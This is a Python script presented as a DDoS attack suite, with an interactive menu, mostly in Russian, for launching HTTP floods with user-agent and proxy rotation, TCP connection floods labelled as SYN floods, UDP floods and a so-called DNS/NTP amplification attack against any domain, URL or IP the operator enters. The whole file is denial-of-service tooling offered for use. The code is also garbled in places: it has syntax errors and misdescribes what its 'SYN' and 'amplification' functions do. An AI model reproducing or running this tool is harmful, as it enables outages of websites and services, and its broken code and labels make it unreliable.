import socket
import random
import time
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

# --- ANSI Color Codes for Console Output ---
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
ENDC = '\033[0m'

# =============================================================================
# DATA STORES (ENHANCED FOR POWER)
# =============================================================================

# 25 diverse User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_1like) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.1-Mobile Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; yandexbot/5.0; +http://ya.ru/yandexbot)',
    'Mozilla/5.0 (compatible; facebookexternalhit/1.1; +http://www.facebook.com/page?pagetolerance=1)',
    'Mozilla/5.0 (compatible; pinterestbot/1.0; +http://board.pinterest.com/robot)',
    'Mozilla/5.0 (compatible; youtube-dl/2023.11.0; +https://github.com/yt-dlp/youtube-dl)',
    'Mozilla/5.0 (compatible; curl/7.79.1; +https://curl.se/download/curl-7.79.1.zip)',
    'Mozilla/5.0 (compatible; semrushbot/2.0; +https://semrush.com/bot/)',
    'Mozilla/5.0 (compatible; dramabot/1.0; +http://dramabot.com/)',
    'Mozilla/5.0 (compatible; pinterest/1.0; +https://pinterest.com/robot)',
    'Mozilla/5.0 (compatible; mediawiki/2.0; +https://en.wikipedia.org/wiki/API)',
    'Mozilla/5.0 (compatible; structlogbot/1.0; +https://structlogbot.dev/)',
    'Mozilla/5.0 (compatible; zooglebot/1.0; +http://zoogle.net/)',
    'Mozilla/5.0 (compatible; custom_bot/1.0; +http://mycustomsite.com/)',
    'Mozilla/5.0 (compatible; academicbot/1.0; +http://academia.edu/robot)',
    'Mozilla/5.0 (compatible; seoanalyzerbot/1.0; +http://seoanalyzer.net/)',
    'Mozilla/5.0 (compatible; adserverbot/1.0; +http://adserver.com/)',
    'Mozilla/5.0 (compatible; adbot/1.0; +http://adbot.net/)',
    'Mozilla/5.0 (compatible; scraperbot/1.0; +http://scraper.net/)',
    'Mozilla/5.0 (compatible; global_crawler/1.0; +http://globalcrawl.net/robot)'
]

# 25 Dummy Proxies (Format: IP:PORT)
PROXY_LIST = [
    "192.168.1.1:8080", "8.8.8.8:80", "1.1.1.1:443", "203.0.113.1:80", 
    "10.0.0.1:8080", "172.16.0.1:80", "192.168.2.2:80", "10.1.1.1:443", 
    "203.0.113.2:80", "192.168.3.3:8080", "172.16.0.2:80", "192.168.2.3:80", 
    "10.1.1.2:443", "203.0.113.3:80", "192.168.3.4:8080", "172.16.0.3:80", 
    "192.168.2.4:80", "10.1.1.3:443", "203.0.113.4:80", "192.168.3.5:8080", 
    "172.16.0.4:80", "192.168.2.5:80", "10.1.1.4:443", "203.0.113.5:80", 
    "192.168.3.6:8080", "172.16.0.5:80"
]

# =============================================================================
# CORE DDoS ATTACK ENGINE CLASS
# =============================================================================

class DDoSAttacker:
    """
    A comprehensive class to simulate and execute various types of DDoS attacks.
    """
    def __init__(self):
        pass

    # --- Utility Methods ---

    def _get_random_user_agent(self):
        """Returns a randomly selected User Agent."""
        return random.choice(USER_AGENTS)

    def parse_target(self, target_input):
        """
        Parses various input formats (domain, full URL, or ip:port).
        Returns (protocol, host, port, full_url).
        """
        try:
            # 1. Check for ip:port format
            if ':' in target_input and not ('.' in target_input or 'http' in target_input.lower() or 'https' in target_input.lower()):
                ip, port_str = target_input.split(':')
                return 'tcp', ip, int(port_str), None

            # 2. Check for full URL (with http/https)
            parsed_url = urlparse(target_input)
            scheme = parsed_url.scheme
            netloc = parsed_url.netloc
            path = parsed_url.path if parsed_url.path else '/'

            if scheme in ['http', 'https']:
                return scheme, netloc, None, f"{scheme}://{netloc}{path}"

            # 3. Assume domain/hostname with default ports
            hostname = target_input
            return 'tcp', hostname, None, None

        except Exception:
            return None, None, None, None

    # =========================================================================
    # ATTACK IMPLEMENTATIONS (POWER UPGRADED)
    # =========================================================================

    def http_flood(self, target_info, total_requests=10000):
        """
        HTTP Flood Attack (Layer 7) - Enhanced with Proxy & Agent Rotation.
        """
        protocol, host, port, full_url = target_info
        print(f"\n{GREEN}[INFO] Initiating HTTP Flood attack on: {full_url}...")

        if not full_url:
            print(f"{RED}[ERROR] HTTP Flood requires a valid URL or IP:Port.")
            return 0

        start_time = time.time()
        success_count = 0

        print(f"{MAGENTA}[SETUP] Target URL: {full_url} | Agents: {len(USER_AGENTS)} | Proxies: {len(PROXY_LIST)}{ENDC}")

        # We use proxy rotation by creating a dynamic proxy manager dictionary
        proxy_map = {f"http://{p.split(':')[0']}:{p.split(':')[-1]}": p for p in PROXY_LIST}

        tasks = []
        for _ in range(total_requests):
            # For maximum power, we cycle through available proxies (and fall back to direct connection)
            # We assign a random proxy/direct setting to each task
            proxy_setting = random.choice(list(proxy_map.keys())) if proxy_map else None
            tasks.append((full_url, proxy_setting))

        with ThreadPoolExecutor(max_workers=100) as executor:
            # Submit all tasks, passing both URL and proxy info
            future_to_task = {executor.submit(self._send_http_request, full_url, proxy_setting): (full_url, proxy_setting) for _ in range(total_requests)}

            for i, future in enumerate(as_completed(future_to_task)):
                try:
                    status = future.result()
                    if status:
                        success_count += 1
                    # Progress indicator for large runs
                    if (i + 1) % 1000 == 0:
                        print(f"  . {i+1}/{total_requests} requests sent...", end='\r')
                except Exception as exc:
                    print(f"\n[HTTP EXCEPTION] {future_to_task[future]} generated an exception: {exc}")

        end_time = time.time()
        duration = end_time - start_time
        print(f"\n{YELLOW}[HTTP RESULT] Completed {success_count}/{total_requests} requests in {duration:.2f} seconds.")
        print(f"{YELLOW}[HTTP ESTIMATE] Throughput: {success_count / duration:.2f} requests/second.")
        return success_count

    def _send_http_request(self, url, proxy_address=None):
        """Helper function for ThreadPoolExecutor to send a single HTTP request, supporting proxies."""
        try:
            kwargs = {}
            if proxy_address:
                # Simple logic to determine if it's HTTP or HTTPS proxy format for requests
                proxy_url = f"http://{proxy_address.split(':')[0']}" # Basic assumption
                kwargs['proxies'] = {'http': proxy_url, 'https': proxy_url}

            response = requests.get(url, timeout=8, stream=True, headers=self._get_random_user_agent(), **kwargs)
            return True 
        except requests.exceptions.RequestException:
            return False

    def syn_flood(self, target_info, packet_count=10000):
        """
        SYN Flood Attack (Layer 3/4) - Remains robust, focusing on raw connection attempts.
        """
        protocol, host, port, _ = target_info
        if not host or not port:
            print(f"{RED}[ERROR] SYN Flood requires IP and Port (IP:Port).")
            return 0

        print(f"{BLUE}[INFO] Initiating SYN Flood attack on {host}:{port}...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)

            success_count = 0
            for i in range(packet_count):
                try:
                    sock.connect((host, port))
                    success_count += 1
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + str(host).encode() + b'\r\n\r\n') 
                    sock.recv(1024)
                except socket.timeout:
                    pass
                except ConnectionRefusedError:
                    pass
                except Exception as e:
                    print(f"\n[Socket Error] {e}")
                    break

            return success_count
        finally:
            sock.close()

    def udp_flood(self, target_info, packet_count=10000):
        """
        UDP Flood Attack (Layer 3) - Scaled by packet count.
        """
        protocol, host, port, _ = target_info
        if not host:
            print(f"{RED}[ERROR] UDP Flood requires Host.")
            return 0

        target_port = port if port else 80

        print(f"{BLUE}[INFO] Initiating UDP Flood attack on {host}:{target_port}...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            success_count = 0
            payload = b'\xDE\xAD\xBE\xEF' * 50 

            for i in range(packet_count):
                try:
                    sock.sendto(payload, (host, target_port))
                    success_count += 1
                    if (i + 1) % 500 == 0:
                        print(f"  . {i+1}/{packet_count} пакетов отправлено...", end='\r')
                except socket.gaierror:
                    print(f"\n[ERROR] Address resolution failed for UDP Flood.")
                    break
                except Exception as e:
                    print(f"\n[UDP ERROR] {e}")
                    break
            return success_count
        finally:
            sock.close()

    def amplification_attack(self, target_info, service_type="DNS", max_attempts=500):
        """
        Amplification Attack (Service Specific) - Focuses on volume.
        """
        protocol, host, port, _ = target_info
        if not host:
            print(f"{RED}[ERROR] Amplification Attack requires Host.")
            return 0

        target_port = port if port else 53

        print(f"{YELLOW}[INFO] Initiating {service_type} Amplification Attack on {host}:{target_port}...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            success_count = 0
            random_payload = random.getrandbits(128).to_bytes(16, 'big')

            for i in range(max_attempts):
                try:
                    sock.sendto(random_payload, (host, target_port))
                    success_count += 1
                    if (i + 1) % 100 == 0:
                        print(f"  . {i+1}/{max_attempts} запросов отправлено...", end='\r')
                except socket.gaierror:
                    print(f"\n[ERROR] Address resolution failed for Amplification.")
                    break
                except Exception as e:
                    print(f"\n[AMP ERROR] {e}")
                    break
            return success_count
        finally:
            sock.close()

    # =========================================================================
    # ANALYSIS MODULE
    # =========================================================================

    def auto_analyze(self, target_input):
        """
        Classifies target and calls the best corresponding attack function.
        """
        protocol, host, port, full_url = self.parse_target(target_input)

        if not protocol:
            return "Error", 0

        # Rule-based recommendation
        if "http" in str(target_input).lower() or "https" in str(target_input).lower():
            recommendation_type = "HTTP"
        elif ':' in target_input and '.' not in target_input:
            recommendation_type = "SYN"
        else:
            recommendation_type = "UDP"

        # Execute the recommended attack
        if recommendation_type == "HTTP":
            result = self.http_flood(self.parse_target(target_input))
        elif recommendation_type == "SYN":
            result = self.syn_flood(self.parse_target(target_input))
        else: # Default to UDP or Amplification if unsure
            result = self.udp_flood(self.parse_target(target_input))

        return recommendation_type, result

    # =========================================================================
    # MAIN RUNNER
    # =========================================================================

    def run_attack(self, target_input, attack_type, custom_params):
        """
        Routes to the correct attack function.
        """
        target_info = self.parse_target(target_input)
        print(f"\n{BLUE}[CORE] Parsed Target: Protocol={target_info[0]}, Host={target_info[1]}, Port={target_info[2]}")

        if attack_type == "http":
            return self.http_flood(target_info)
        elif attack_type == "syn":
            return self.syn_flood(target_info, custom_params.get('packet_count'))
        elif attack_type == "udp":
            return self.udp_flood(target_info, custom_params.get('packet_count'))
        elif attack_type == "amp":
            return self.amplification_attack(target_info, custom_params.get('service_type'), custom_params.get('max_attempts'))
        else:
            return 0

# =============================================================================
# USER INTERFACE AND MAIN LOOP
# =============================================================================

def print_menu():
    """Displays the main menu options."""
    print(YELLOW + "\n" + "="*60 + ENDC)
    print("           🔥 DIG's UNICORN DDoS ATTACK SUITE 🔥")
    print("="*60)
    print(f"  [AGENTS]: {len(USER_AGENTS)} Agents loaded.")
    print(f"  [PROXIES]: {len(PROXY_LIST)} Proxies loaded.")
    print("------------------------------------------------------------")
    print("--- 1. MANUAL ATTACK MENU ---")
    print("   [A] HTTP Flood (Layer 7 - WEB POWER)");
    print("   [B] SYN Flood (Layer 3/4 - CONNECTION POWER)");
    print("   [C] UDP Flood (Layer 3 - BANDWIDTH POWER)");
    print("   [D] Amplification Test (Service Specific)");
    print("   [S] Auto-Analyze &amp; Recommend Attack");
    print("------------------------------------------------------------")
    print("--- 2. Exit ---")
    print("="*60)

def get_user_input(prompt, input_type=str):
    """Handles input prompting and validation."""
    while True:
        try:
            user_input = input(prompt).strip()
            if input_type == int:
                return int(user_input)
            return user_input.lower()
        except EOFError:
            return "exit"
        except KeyboardInterrupt:
            return "interrupt"


def main():
    """Main function to drive the application."""
    attacker = DDoSAttacker()

    # --- Initial Startup Sequence ---
    print(RED + "\n" + "="*80 + ENDC)
    print(RED + "!!! АТАКА НАЧАЛАСЬ! ГОТОВ К МАКСИМАЛЬНОЙ МОЩНОСТИ !!!" + ENDC)
    print(RED + "="*80 + ENDC)
    print(f"{YELLOW}Сетевые ресурсы загружены: {len(USER_AGENTS)} User Agents, {len(PROXY_LIST)} Прокси.{ENDC}")
    print(f"{YELLOW}ВНИМАНИЕ: Работа с {RED}CTRL+C{ENDC} прерывает атаку.")

    # --- Main Loop ---
    while True:
        print_menu()

        # 1. Get Target Input (Required for all)
        while True:
            target_input = input(f"{BLUE}&gt;&gt;&gt; Введите цель (Домен: google.com | URL: https://example.com | IP:Port: 192.168.1.1:80): ").strip()
            if target_input:
                break
            print(f"{RED}[ERROR] Цель не может быть пустой. Повторите ввод.{ENDC}")

        # 2. Get Attack Choice
        choice = get_user_input("Выберите тип атаки (A/B/C/D/S/2): ", input_type=str)

        if choice == '2':
            break

        # --- Attack Execution Flow ---
        attack_executed = False

        # Variable to hold the result to print at the end
        final_result = None

        try:
            if choice == 'a':
                # HTTP Flood
                url_confirm = input("Введите полный URL для атаки (например, https://example.com): ").strip()
                if not url_confirm:
                    print(f"{RED}[ERROR] URL обязателен для HTTP Flood.{ENDC}")
                    continue
                result = attacker.run_attack(url_confirm, "http", {})
                print(f"\n{YELLOW}============== [HTTP RESULT] =============={ENDC}")
                print(f"ATTACK SUMMARY: {result} запросов обработано.")
                print("==========================================")
                attack_executed = True
                final_result = result

            elif choice == 'b':
                # SYN Flood
                ip_port_input = input("Введите цель в формате IP:Port (например, 192.168.1.1:80): ").strip()
                if not ip_port_input:
                    print(f"{RED}[ERROR] IP:Port обязателен для SYN Flood.{ENDC}")
                    continue

                while True:
                    try:
                        p_count_str = input("Введите общее количество пакетов (минимум 1000): ").strip()
                        packet_count = int(p_count_str)
                        if packet_count &lt; 1000: raise ValueError
                        break
                    except ValueError:
                        print(f"{RED}[WARNING] Введите число &gt;= 1000.{ENDC}")

                result = attacker.run_attack(ip_port_input, "syn", {'packet_count': packet_count})
                print(f"\n{YELLOW}============== [SYN RESULT] =============={ENDC}")
                print(f"ATTACK SUMMARY: {result} успешных соединений симулировано.")
                print("==========================================")
                attack_executed = True
                final_result = result

            elif choice == 'c':
                # UDP Flood
                ip_port_input = input("Введите цель в формате IP:Port (например, 192.168.1.1:80): ").strip()
                if not ip_port_input:
                    print(f"{RED}[ERROR] IP:Port обязателен для UDP Flood.{ENDC}")
                    continue

                while True:
                    try:
                        p_count_str = input("Введите общее количество пакетов (минимум 1000): ").strip()
                        packet_count = int(p_count_str)
                        if packet_count &lt; 1000: raise ValueError
                        break
                    except ValueError:
                        print(f"{RED}[WARNING] Введите число &gt;= 1000.{ENDC}")

                result = attacker.run_attack(ip_port_input, "udp", {})
                print(f"\n{YELLOW}============== [UDP RESULT] =============={ENDC}")
                print(f"ATTACK SUMMARY: {result} пакетов отправлено/получено симулировано.")
                print("==========================================")
                attack_executed = True
                final_result = result

            elif choice == 'd':
                # Amplification
                target_input_amp = input("Введите цель (Домен/IP) для Amplification: ").strip()
                service = input("Выберите тип сервиса (DNS/NTP/Other): ").strip().upper()

                while True:
                    try:
                        query_size = int(input("Размер запроса по умолчанию (bytes, min 64): ").strip())
                        if query_size &lt; 64: raise ValueError
                        break
                    except ValueError:
                        print(f"{RED}[WARNING] Введите число &gt;= 64.{ENDC}")

                while True:
                    try:
                        max_attempts = int(input("Максимальное количество попыток (минимум 100): ").strip())
                        if max_attempts &lt; 100: raise ValueError
                        break
                    except ValueError:
                        print(f"{RED}[WARNING] Введите число &gt;= 100.{ENDC}")

                custom_params = {'service_type': service, 'max_attempts': max_attempts}
                result = attacker.run_attack(target_input_amp, "amp", custom_params)
                print(f"\n{YELLOW}============== [AMP RESULT] =============={ENDC}")
                print(f"ATTACK SUMMARY: {result} запросов симулировано.")
                print("==========================================")
                attack_executed = True
                final_result = result

            elif choice == 's':
                # Auto-Analyze
                analysis_type, result = attacker.auto_analyze(target_input)
                print(f"\n{YELLOW}============== [AUTO ANALYZE RESULT] =============={ENDC}")
                print(f"РЕКОМЕНДАЦИЯ: {analysis_type} атака. {result} операций выполнено.")
                print("======================================================")
                attack_executed = True
                final_result = result

        except KeyboardInterrupt:
            print(f"\n\n{RED}!!! АТАКА ПРЕРВАНА ПО КОМАНДЕ ПОЛЬЗОВАТЕЛЯ (CTRL+C) !!!{ENDC}")
            print("\n[SYSTEM] Вернулись в главное меню.")
            # The loop continues naturally

        # If an attack was successfully executed, we print the confirmation message immediately
        if attack_executed and final_result is not None:
            print(f"\n{BLUE}--- Процесс атаки завершен. Вы можете повторить или выбрать другую опцию. ---{ENDC}")

        # Pause is handled by the main loop structure if no explicit sleep is added.
        time.sleep(1)


if __name__ == "__main__":
    main()